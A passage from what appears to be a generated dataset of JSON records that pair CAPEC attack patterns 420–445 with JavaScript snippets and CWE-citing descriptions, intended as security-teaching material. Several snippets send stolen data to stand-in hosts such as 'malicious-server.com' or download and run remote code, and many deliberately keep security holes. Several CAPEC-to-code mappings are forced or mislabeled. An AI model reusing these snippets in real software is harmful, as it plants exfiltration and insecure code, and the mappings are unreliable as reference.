        "description": "This JavaScript code snippet demonstrates the concept of 'Influence Perception of Scarcity' by creating a sense of urgency around the availability of an item. The `checkStock` function checks if the item is in stock, and the `purchaseItem` function uses this information to inform the user that there are only a few items left, encouraging them to make a purchase quickly. This leverages the perception of scarcity to influence user behavior. The code also touches on CWE-654 (Reliance on a Single Factor in a Security Decision) by relying solely on the stock count to make purchasing decisions, CWE-405 (Asymmetric Resource Consumption) by potentially allowing multiple purchase attempts without proper control, and CWE-656 (Reliance on Security Through Obscurity) by not securing the stock count information."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  const { headers } = req;\n  const authHeader = headers['authorization'];\n\n  // CWE-654: Reliance on a Single Factor in a Security Decision\n  if (authHeader && authHeader === 'Bearer trusted-token') {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    // CWE-300: Channel Accessible by Non-Endpoint\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('Sensitive Information: User credentials are admin:password123');\n  } else {\n    res.writeHead(403, { 'Content-Type': 'text/plain' });\n    res.end('Forbidden');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It checks for an 'Authorization' header and grants access to sensitive information if the header contains a specific token ('Bearer trusted-token'). This embodies the CAPEC 'Influence Perception of Authority' by demonstrating how an adversary could exploit a single-factor authentication mechanism (CWE-654) and improper verification of the communication channel's source (CWE-940, CWE-300) to gain unauthorized access. The code also highlights the risk of relying on a single condition for security decisions, making it vulnerable to impersonation attacks."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "const express = require('express');\nconst app = express();\nlet requestCount = 0;\n\napp.use((req, res, next) => {\n  requestCount++;\n  if (requestCount > 100) {\n    return res.status(429).send('Too many requests');\n  }\n  next();\n});\n\napp.post('/minor-task', (req, res) => {\n  // Simulate a minor task\n  res.send('Minor task completed');\n});\n\napp.post('/major-task', (req, res) => {\n  // Simulate a major task\n  res.send('Major task completed');\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that demonstrates the 'Influence Perception of Commitment and Consistency' CAPEC. The server has two endpoints: '/minor-task' and '/major-task'. The '/minor-task' endpoint represents a minor task that an adversary might use to build trust with the target. After the target completes the minor task, they are more likely to comply with a request to complete the '/major-task'. The middleware function tracks the number of requests and limits them to 100 to prevent abuse (CWE-799). The code does not verify the source of the requests (CWE-940), and it could potentially reveal discrepancies in behavior based on the request count (CWE-203)."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Simulated user database\nconst users = {\n  'user1': { password: 'password123', likes: ['user2'] },\n  'user2': { password: 'password456', likes: [] }\n};\n\n// Middleware to simulate authentication\napp.use((req, res, next) => {\n  const { username, password } = req.query;\n  if (users[username] && users[username].password === password) {\n    req.user = users[username];\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Endpoint to simulate liking another user\napp.get('/like', (req, res) => {\n  const { target } = req.query;\n  if (req.user.likes.includes(target)) {\n    res.send(`You already like ${target}`);\n  } else {\n    req.user.likes.push(target);\n    res.send(`You now like ${target}`);\n  }\n});\n\n// Endpoint to simulate sensitive action based on liking\napp.get('/sensitive-action', (req, res) => {\n  const { target } = req.query;\n  if (req.user.likes.includes(target)) {\n    res.send(`Sensitive action allowed for ${target}`);\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`App listening at http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that simulates a scenario where an adversary can influence a target's actions by building a relationship. The code includes a simulated user database and endpoints for liking another user and performing a sensitive action based on that liking. The authentication middleware demonstrates CWE-301 by using a simple username and password check, which could be vulnerable to reflection attacks. The reliance on a single factor for security decisions (CWE-654) is shown in the sensitive action endpoint, which grants access based solely on whether the user likes the target. The observable behavioral discrepancy (CWE-205) is represented by the different responses based on the user's liking status. Finally, the use of implicit intent for sensitive communication (CWE-927) is demonstrated by the transmission of sensitive data (liking status) through query parameters."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nlet currentUser = 'user4';\n\nfunction authenticate(user) {\n  if (users.includes(user)) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction performAction(action) {\n  if (authenticate(currentUser)) {\n    console.log(`Performing action: ${action}`);\n  } else {\n    console.log('Action not allowed');\n  }\n}\n\n// Adversary influences the target to use a known user\ncurrentUser = 'user1';\nperformAction('delete');",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary influences the target to adopt a behavior that is advantageous to the adversary. The `authenticate` function checks if the `currentUser` is in the list of known users. If the user is authenticated, an action is performed. The adversary can influence the target to use a known user ('user1') to gain access and perform actions. This leverages the CAPEC concept of influencing perception of consensus or social proof. The code also highlights CWE-654 (Reliance on a Single Factor in a Security Decision) by relying solely on the username for authentication, and CWE-203 (Observable Discrepancy) by providing different console messages based on authentication success or failure."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "function requestSensitiveData() {\n  const userResponse = prompt('Would you like to enhance your account security by providing additional information?');\n  if (userResponse.toLowerCase() !== 'no') {\n    const sensitiveData = prompt('Please enter your sensitive information (e.g., SSN, password):');\n    sendToServer(sensitiveData);\n  }\n}\n\nfunction sendToServer(data) {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://malicious-server.com/collect', true); // CWE-941: Incorrectly Specified Destination\n  xhr.send(data);\n}\n\nrequestSensitiveData();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Target Influence via Framing' by using a persuasive prompt to encourage the user to provide sensitive information. The prompt avoids negative language, making the user more likely to comply. The code also embodies several related CWEs: CWE-654 by relying on user input as a single factor for security decisions, CWE-451 by misrepresenting the critical information request as a security enhancement, and CWE-941 by sending the collected data to an incorrect, malicious destination. The function 'requestSensitiveData' frames the request in a positive light, increasing the likelihood of user compliance."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "const users = [{id: 1, name: 'Alice', balance: 100}, {id: 2, name: 'Bob', balance: 50}];\n\nfunction transferFunds(senderId, receiverId, amount) {\n  const sender = users.find(user => user.id === senderId);\n  const receiver = users.find(user => user.id === receiverId);\n\n  if (!sender || !receiver) {\n    console.log('Invalid user IDs');\n    return;\n  }\n\n  if (sender.balance < amount) {\n    console.log('Insufficient funds');\n    return;\n  }\n\n  // Incentivize the sender with a bonus for transferring funds\n  sender.balance -= amount;\n  receiver.balance += amount;\n  sender.balance += 10; // Bonus for transferring funds\n\n  console.log(`Transfer complete. Sender's new balance: ${sender.balance}, Receiver's new balance: ${receiver.balance}`);\n}\n\n// Example usage\ntransferFunds(1, 2, 30);",
        "description": "This JavaScript code snippet demonstrates a simple fund transfer system where users can transfer money to each other. The function `transferFunds` takes the sender's ID, receiver's ID, and the amount to be transferred. If the transfer is successful, the sender receives a bonus of 10 units as an incentive. This embodies the CAPEC concept of 'Influence via Incentives' by manipulating the sender's behavior through a financial incentive. The code also touches on related CWEs: it indirectly creates a new resource (bonus) that can be exploited (CWE-1229), and it relies on a single factor (balance check) for security decisions (CWE-654)."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "const users = [{username: 'admin', password: 'admin123'}, {username: 'user', password: 'user123'}];\n\nfunction authenticate(username, password) {\n  const user = users.find(u => u.username === username);\n  if (user && user.password === password) {\n    console.log('Authentication successful');\n    return true;\n  } else {\n    console.log('Authentication failed');\n    return false;\n  }\n}\n\nfunction performSensitiveAction(username, password) {\n  if (authenticate(username, password)) {\n    console.log('Sensitive action performed');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// Simulating an attack by influencing the user to use a weak password\nconst influencedUsername = 'user';\nconst influencedPassword = 'user123';\nperformSensitiveAction(influencedUsername, influencedPassword);",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that relies on a single factor (username and password) to grant access to sensitive actions. The code includes a function `authenticate` that checks if the provided username and password match any user in the predefined list. If authentication is successful, it allows performing a sensitive action. The snippet also simulates an attack where an adversary influences a user to use a weak password ('user123'), leveraging psychological principles to make the user choose easily guessable credentials. This example embodies the CAPEC idea of influencing behavior and highlights related CWEs such as reliance on a single factor in security decisions (CWE-654) and the potential for observable behavioral discrepancies (CWE-205) when authentication fails or succeeds."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const message = data.toString();\n    if (message.includes('password')) {\n      console.log('Sensitive information received:', message);\n    }\n    // Simulate rapport by echoing back the message\n    socket.write(`You said: ${message}`);\n  });\n});\n\nserver.listen(1337, '127.0.0.1', () => {\n  console.log('Server listening on port 1337');\n});",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. When data is received, it checks if the message contains the word 'password' and logs it, simulating the collection of sensitive information. The server then echoes back the received message to the client, mimicking the technique of building rapport by matching the client's communication style. This code embodies the CAPEC 'Influence via Modes of Thinking' by demonstrating how an adversary might tailor communication to extract sensitive information. The related CWEs are represented by the lack of proper verification of the communication channel (CWE-940), potential truncation of security-relevant information (CWE-222), and the creation of a new resource (the echoed message) that could be exploited (CWE-1229)."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "document.addEventListener('mousemove', function(event) {\n  let eyeMovementData = {\n    x: event.clientX,\n    y: event.clientY\n  };\n  // Simulate sending data to an attacker-controlled server\n  fetch('http://malicious-server.com/eye-data', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify(eyeMovementData)\n  });\n});\n\n// UI Misrepresentation of Critical Information\nfunction displaySecurityMessage(success) {\n  let message = success ? 'Operation successful' : 'Operation failed';\n  document.getElementById('status').innerText = message;\n}\n\n// Observable Discrepancy\nfunction performSensitiveOperation() {\n  let success = Math.random() > 0.5;\n  displaySecurityMessage(success);\n  return success;\n}\n\n// Truncation of Security-relevant Information\nfunction logOperationResult(result) {\n  let truncatedResult = result.substring(0, 10); // Truncate to obscure details\n  console.log('Operation result:', truncatedResult);\n}\n\n// Guessable CAPTCHA\nfunction validateCaptcha(input) {\n  let captcha = '1234'; // Easily guessable CAPTCHA\n  return input === captcha;\n}",
        "description": "This JavaScript code snippet demonstrates the concept of 'Target Influence via Eye Cues' by capturing and sending eye movement data to a malicious server. It also incorporates several related CWEs:\n1. **Observable Behavioral Discrepancy (CWE-205)**: The `performSensitiveOperation` function displays different messages based on the success of an operation, which can be observed by an attacker.\n2. **Truncation of Security-relevant Information (CWE-222)**: The `logOperationResult` function truncates the operation result, potentially obscuring important details.\n3. **Observable Discrepancy (CWE-203)**: The `displaySecurityMessage` function shows different messages based on the operation's success, revealing the internal state.\n4. **User Interface (UI) Misrepresentation of Critical Information (CWE-451)**: The `displaySecurityMessage` function can mislead users about the true state of the operation.\n5. **Guessable CAPTCHA (CWE-804)**: The `validateCaptcha` function uses a simple, easily guessable CAPTCHA, making it vulnerable to automated attacks."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction processData(input) {\n  // Simulate speculative execution vulnerability\n  let result;\n  if (input === 'expected') {\n    result = sensitiveData;\n  } else {\n    result = 'default';\n  }\n  return result;\n}\n\n// Simulate an attacker exploiting the vulnerability\nconst attackerInput = 'unexpected';\nconsole.log(processData(attackerInput));",
        "description": "This JavaScript code snippet demonstrates a simplified version of a speculative execution vulnerability, which is related to CWE-1342 and CWE-1420. The `processData` function contains a conditional check that simulates speculative execution. If the input is 'expected', it returns sensitive data; otherwise, it returns a default value. An attacker can exploit this by providing an unexpected input, potentially causing the processor to transiently execute the branch that exposes sensitive data. This example highlights the risk of exposing sensitive information during transient execution, aligning with the deprecated CAPEC's focus on target influence via micro-expressions and related weaknesses."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const query = req.query.q;\n    try {\n        // Improper validation of input syntax (CWE-1286)\n        if (!query.match(/^[a-zA-Z0-9 ]*$/)) {\n            throw new Error('Invalid input');\n        }\n        // Simulate a search operation\n        res.send(`Results for: ${query}`);\n    } catch (error) {\n        // Generation of error message containing sensitive information (CWE-209)\n        res.status(500).send(`Error: ${error.message} - Query: ${query}`);\n    }\n});\n\napp.use((err, req, res, next) => {\n    // Improper neutralization of script in an error message web page (CWE-81)\n    res.status(500).send(`<h1>Server Error</h1><p>${err.message}</p>`);\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a simple Express.js server with a search endpoint. The code demonstrates several vulnerabilities: \n1. **Improper Validation of Syntactic Correctness of Input (CWE-1286)**: The input query is only superficially validated using a regex that allows alphanumeric characters and spaces, but this validation is insufficient for more complex inputs.\n2. **Generation of Error Message Containing Sensitive Information (CWE-209)**: When an error occurs, the server responds with an error message that includes the original query, potentially exposing sensitive information.\n3. **Improper Neutralization of Script in an Error Message Web Page (CWE-81)**: The global error handler sends an error message to the client without properly neutralizing special characters, which could lead to cross-site scripting (XSS) attacks.\n\nThe code embodies the deprecated CAPEC concept of influencing a target via NLP by demonstrating how improper handling and validation of input can lead to security vulnerabilities that could be exploited to manipulate or extract sensitive information from the system."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\napp.post('/process', (req, res) => {\n  const userInput = req.body.input;\n  // CWE-1286: Improper Validation of Syntactic Correctness of Input\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // CWE-149: Improper Neutralization of Quoting Syntax\n  const sanitizedInput = userInput.replace(/['\"`]/g, '');\n  // CWE-804: Guessable CAPTCHA\n  const captcha = req.body.captcha;\n  if (captcha !== '1234') { // Weak CAPTCHA\n    return res.status(400).send('Invalid CAPTCHA');\n  }\n  // Process the sanitized input\n  res.send(`Processed input: ${sanitizedInput}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server that processes user input. It embodies the main idea of the deprecated CAPEC 'Target Influence via Voice in NLP' by demonstrating how improper handling of user input can lead to vulnerabilities. The code includes checks for CWE-1286 (Improper Validation of Syntactic Correctness of Input) by validating the input against a regex pattern. It also addresses CWE-149 (Improper Neutralization of Quoting Syntax) by sanitizing the input to remove quotes. Additionally, it includes a weak CAPTCHA implementation (CWE-804), which can be easily guessed, representing a potential security flaw. The code highlights the importance of proper input validation, sanitization, and secure CAPTCHA implementation to prevent security vulnerabilities."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    const message = data.toString();\n    console.log('Received:', message);\n    \n    // CWE-120: Buffer Copy without Checking Size of Input\n    let buffer = Buffer.alloc(10);\n    buffer.write(message, 0, 'utf-8');\n    console.log('Processed:', buffer.toString());\n  });\n});\n\nserver.listen(8080, '127.0.0.1');\nconsole.log('Server listening on port 8080');",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming data on port 8080. When data is received, it is converted to a string and logged. The code then attempts to write this message into a fixed-size buffer without checking the size of the input, which can lead to a buffer overflow (CWE-120). Additionally, the data is transmitted and processed in cleartext (CWE-319), making it susceptible to interception. This setup represents the CAPEC concept of 'Target Influence via The Human Buffer Overflow' by demonstrating how improper handling of communication and buffer operations can lead to vulnerabilities that an attacker might exploit to influence or manipulate the target."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "const sensitiveData = { user: 'JohnDoe', email: 'john.doe@example.com', balance: 1000 };\n\nfunction getUserData(query) {\n  if (query === 'balance') {\n    return sensitiveData.balance;\n  } else if (query === 'email') {\n    return sensitiveData.email;\n  } else if (query === 'user') {\n    return sensitiveData.user;\n  } else {\n    return 'Invalid query';\n  }\n}\n\nfunction isHuman(captchaResponse) {\n  const validCaptcha = '1234'; // Guessable CAPTCHA\n  return captchaResponse === validCaptcha;\n}\n\nfunction requestData(query, captchaResponse) {\n  if (isHuman(captchaResponse)) {\n    return getUserData(query);\n  } else {\n    return 'CAPTCHA validation failed';\n  }\n}\n\n// Example usage\nconsole.log(requestData('balance', '1234')); // Exposes sensitive balance information\nconsole.log(requestData('email', '1234')); // Exposes sensitive email information\nconsole.log(requestData('user', '1234')); // Exposes sensitive user information",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information can be exposed through data queries, which aligns with CWE-202. The `getUserData` function returns sensitive user information based on the query parameter. The `isHuman` function uses a guessable CAPTCHA (CWE-804), making it easy for an attacker to bypass the CAPTCHA check. The `requestData` function combines these elements, allowing an attacker to infer sensitive information by making specific queries. This represents the main idea of CAPEC-Target Influence via Interview and Interrogation, where an attacker can extract sensitive information by manipulating the system's responses."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (req.headers['x-custom-header'] !== 'expected-value') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const options = {\n    hostname: 'trusted-endpoint.com',\n    port: 80,\n    path: '/api/data',\n    method: 'GET'\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    let data = '';\n    proxyRes.on('data', (chunk) => {\n      data += chunk;\n    });\n    proxyRes.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(data);\n    });\n  });\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  proxyReq.on('error', (e) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Internal Server Error');\n  });\n\n  proxyReq.end();\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that proxies requests to a trusted endpoint. It demonstrates several vulnerabilities: \n1. CWE-940: The server checks a custom header to verify the source of the request, but this is a weak verification method that can be easily spoofed.\n2. CWE-941: The destination for the outgoing request is hardcoded, which may not be correctly specified or could be manipulated.\n3. CWE-300: The error handling for the proxy request does not ensure the integrity of the communication channel, potentially allowing non-endpoint actors to influence the channel.\n\nThe code represents the main idea of the CAPEC 'Target Influence via Instant Rapport' by showing how inadequate verification and improper channel handling can allow unauthorized actors to influence the communication process."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "const fs = require('fs');\n\n// Simulate reliance on an insufficiently trustworthy component\nconst loadComponent = (componentPath) => {\n  try {\n    const component = require(componentPath);\n    return component;\n  } catch (error) {\n    console.error('Failed to load component:', error);\n    return null;\n  }\n};\n\n// Simulate unprotected confidential information\nconst confidentialData = 'Sensitive Information';\n\n// Simulate product released in non-release configuration\nconst isProduction = false;\n\n// Simulate insufficient technical documentation\nconst technicalDocs = null;\n\n// Simulate reliance on a non-updateable component\nconst nonUpdateableComponent = loadComponent('./nonUpdateableComponent');\n\nif (!isProduction) {\n  console.warn('Warning: Product is not in production configuration!');\n}\n\nif (!technicalDocs) {\n  console.warn('Warning: Insufficient technical documentation!');\n}\n\nif (nonUpdateableComponent) {\n  console.log('Loaded non-updateable component:', nonUpdateableComponent);\n}\n\n// Simulate access to confidential data by an untrusted component\nif (nonUpdateableComponent) {\n  nonUpdateableComponent.accessData(confidentialData);\n}",
        "description": "This JavaScript code snippet simulates a scenario where a product is vulnerable due to several issues highlighted in the CAPEC and related CWEs. The code demonstrates reliance on an insufficiently trustworthy component, unprotected confidential information, a product released in a non-release configuration, insufficient technical documentation, and reliance on a non-updateable component. The `loadComponent` function attempts to load a component, which could be malicious if tampered with during manufacture. The `confidentialData` variable represents sensitive information that could be accessed by an untrusted component. The `isProduction` flag indicates whether the product is in a production configuration, and the `technicalDocs` variable represents the presence of technical documentation. The code logs warnings and attempts to access confidential data using a potentially malicious component, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate a third-party component with known vulnerabilities\nconst vulnerableComponent = require('vulnerable-component');\n\n// Function to read a configuration file\nfunction readConfig(filePath) {\n  try {\n    const configPath = path.resolve(__dirname, filePath);\n    const config = fs.readFileSync(configPath, 'utf8');\n    return JSON.parse(config);\n  } catch (error) {\n    console.error('Error reading configuration:', error);\n    return null;\n  }\n}\n\n// Simulate the use of a non-release configuration\nconst config = readConfig('config/development.json');\n\n// Expose sensitive information\nif (config) {\n  console.log('Sensitive Information:', config.sensitiveData);\n}\n\n// Simulate observable behavioral discrepancy\nif (process.env.NODE_ENV !== 'production') {\n  console.log('Running in non-production mode');\n}\n\n// Use the vulnerable third-party component\nvulnerableComponent.doSomething();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Manipulation During Distribution'. It includes the use of a third-party component with known vulnerabilities (CWE-1395), reading a non-release configuration file (CWE-1269), and exposing sensitive information (CWE-200). Additionally, it shows an observable behavioral discrepancy by logging a message when not in production mode (CWE-207). The code represents the main idea of the CAPEC by highlighting how an attacker could manipulate or tamper with a product during its distribution, leading to various security weaknesses."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "class HardwareComponent {\n  constructor(version) {\n    this.version = version;\n    this.redundancy = true;\n  }\n\n  injectError() {\n    // CWE-1334: Unauthorized Error Injection\n    this.redundancy = false;\n    console.log('Error injected: Redundancy disabled');\n  }\n\n  glitchProtection(voltage, clock) {\n    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    if (voltage < 1.0 || clock < 1.0) {\n      console.log('Warning: Voltage or clock glitch detected');\n    } else {\n      console.log('System stable');\n    }\n  }\n\n  updateFirmware(newVersion) {\n    // CWE-1329: Reliance on Component That is Not Updateable\n    if (this.version === 'non-updateable') {\n      console.log('Error: Component cannot be updated');\n    } else {\n      this.version = newVersion;\n      console.log('Firmware updated to version ' + newVersion);\n    }\n  }\n\n  downgradeFirmware(oldVersion) {\n    // CWE-1328: Security Version Number Mutable to Older Versions\n    this.version = oldVersion;\n    console.log('Firmware downgraded to version ' + oldVersion);\n  }\n}\n\n// Example usage\nlet component = new HardwareComponent('1.0');\ncomponent.injectError();\ncomponent.glitchProtection(0.9, 1.2);\ncomponent.updateFirmware('2.0');\ncomponent.downgradeFirmware('1.0');",
        "description": "This JavaScript code snippet represents a simplified model of a hardware component that embodies the main idea of a Hardware Integrity Attack (CAPEC). The class `HardwareComponent` includes methods that simulate vulnerabilities described by the related CWEs. The `injectError` method demonstrates CWE-1334 by disabling redundancy. The `glitchProtection` method checks for voltage and clock glitches, representing CWE-1247. The `updateFirmware` method shows the issue of non-updateable components (CWE-1329), and the `downgradeFirmware` method allows firmware rollback to older, potentially vulnerable versions (CWE-1328). This code illustrates how an adversary might exploit these weaknesses to compromise hardware integrity."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "function benignFunction() {\n  console.log('This is a benign function.');\n}\n\nfunction maliciousLogic() {\n  // Malicious code that sends user data to an external server\n  fetch('http://malicious-server.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive user data' }),\n    headers: { 'Content-Type': 'application/json' }\n  });\n}\n\n// Improper access control allows unauthorized execution of malicious logic\nif (userIsAuthenticated) {\n  benignFunction();\n} else {\n  maliciousLogic();\n}\n\n// Replicating malicious code\nfunction replicateMalware() {\n  // Code to replicate the malware to other systems\n  console.log('Replicating malware to other systems.');\n}\n\nreplicateMalware();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Logic Insertion' by embedding malicious logic within a seemingly benign function. The 'benignFunction' represents a harmless operation, while 'maliciousLogic' contains code that sends sensitive user data to an external server, illustrating CWE-506 (Embedded Malicious Code). The improper access control (CWE-284) is shown by conditionally executing the malicious logic based on a flawed authentication check. Additionally, the 'replicateMalware' function represents CWE-509 (Replicating Malicious Code) by simulating the replication of malware to other systems. This code embodies the main idea of CAPEC by demonstrating how malicious logic can be hidden within a benign component and executed under certain conditions, leading to negative impacts on the system and its users."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "function benignFunction() {\n  console.log('This is a benign function.');\n}\n\nfunction maliciousFunction() {\n  // Malicious code hidden from the user\n  fetch('http://malicious-site.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive information' })\n  });\n}\n\n// Trojan Horse: benignFunction appears harmless but calls maliciousFunction\nfunction trojanHorse() {\n  benignFunction();\n  maliciousFunction();\n}\n\ntrojanHorse();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The 'benignFunction' appears to be a harmless function that logs a message to the console. However, the 'trojanHorse' function, which seems to call only the benign function, also calls 'maliciousFunction' that sends sensitive information to a malicious site. This represents the CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse) by embedding hidden malicious logic within seemingly benign code. The code snippet embodies the idea of an adversary adding hidden malicious logic to otherwise benign software, which is executed without the user's knowledge."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "function downloadAndExecute(url) {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Error:', error));\n}\n\n// Malicious logic inserted by an authorized developer\nfunction maliciousFunction() {\n  // CWE-506: Embedded Malicious Code\n  console.log('Executing malicious code');\n  // CWE-1229: Creation of Emergent Resource\n  document.cookie = 'sessionId=maliciousSession';\n}\n\n// Insecure permissions example\nObject.defineProperty(Object.prototype, 'insecureProperty', {\n  value: 'insecure',\n  writable: true, // CWE-277: Insecure Inherited Permissions\n  enumerable: true,\n  configurable: true\n});\n\n// Lack of administrator control over security\nfunction insecureSecuritySettings() {\n  // CWE-671: Lack of Administrator Control over Security\n  console.log('Security settings cannot be tailored by admin');\n}\n\n// Example usage\nmaliciousFunction();\ndownloadAndExecute('http://example.com/malicious.js');\ninsecureSecuritySettings();",
        "description": "This JavaScript code snippet demonstrates the insertion of malicious logic by an authorized developer. The `downloadAndExecute` function fetches and executes code from a remote URL without verifying its integrity (CWE-494). The `maliciousFunction` contains embedded malicious code (CWE-506) that sets a cookie with a potentially harmful value (CWE-1229). The code also defines an insecure property on the Object prototype, which can be inherited by all objects (CWE-277). Finally, the `insecureSecuritySettings` function represents a scenario where security settings cannot be tailored by an administrator (CWE-671). This snippet embodies the main idea of CAPEC-184: 'Malicious Logic Inserted Into Product by Authorized Developer'."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "function authenticate(user, password) {\n  // Security-critical check\n  if (user === 'admin' && password === 'securePassword') {\n    console.log('Authenticated');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Malicious code inserted during development\nfunction authenticate(user, password) {\n  if (user === 'admin') {\n    console.log('Authenticated');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Usage\nauthenticate('admin', 'wrongPassword');",
        "description": "This JavaScript code snippet demonstrates a development alteration attack where an adversary modifies the authentication function during development. The original function includes a security-critical check that verifies both the username and password. However, the malicious version of the function, which could be inserted by an insider, bypasses the password check entirely, allowing unauthorized access. This represents CWE-506 (Embedded Malicious Code) and CWE-733 (Compiler Optimization Removal or Modification of Security-critical Code) by showing how a critical security mechanism can be altered or removed. The code also indirectly touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by potentially allowing unauthorized access to sensitive system information."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious-server.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    fs.writeFileSync('malicious-code.js', data);\n    require('./malicious-code.js');\n  });\n});\n\n// CWE-506: Embedded Malicious Code\nfunction updateConfig() {\n  // Malicious logic inserted into configuration management\n  fs.writeFileSync('config.json', JSON.stringify({ setting: 'malicious' }));\n}\n\nupdateConfig();",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary exploits a configuration management system to insert malicious logic into a software product. The code downloads a script from a remote server without performing any integrity checks (CWE-494), writes it to the local file system, and then includes and executes it (CWE-829). Additionally, it shows how malicious logic can be embedded directly into the configuration management system by modifying a configuration file (CWE-506). This represents the main idea of the CAPEC, where an adversary manipulates the configuration management to introduce malicious code into the software product."
    },
    {
        "capec_id": "446",
